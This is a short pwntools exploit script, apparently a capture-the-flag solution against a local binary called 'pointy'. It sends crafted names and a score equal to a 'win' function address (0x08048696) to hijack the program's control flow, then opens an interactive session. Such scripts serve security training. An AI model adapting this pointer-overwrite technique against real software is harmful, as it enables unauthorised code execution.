from pwn import *

win_add = 0x08048696
payload = 'bbbb'
payload += p32(win_add)
a = process('./pointy')

raw_input('debug')

a.recvuntil('Input the name of a student')
a.sendline('linh')
a.recvuntil('Input the name of the favorite professor of a student ')
a.sendline('aaaa')
a.recvuntil('Input the name of the student that will give the score ')
a.sendline('linh')
a.recvuntil('Input the name of the professor that will be scored ')
a.sendline('aaaa')
a.recvuntil("Input the score: ")
a.sendline('134514326')

a.recvuntil('Input the name of a student')
a.sendline('bbbb')
a.recvuntil('Input the name of the favorite professor of a student ')
a.sendline('cccc')
a.recvuntil('Input the name of the student that will give the score ')
a.sendline('aaaa')
a.recvuntil('Input the name of the professor that will be scored ')
a.sendline('cccc')
a.recvuntil("Input the score: ")
a.sendline('134514326')

a.interactive()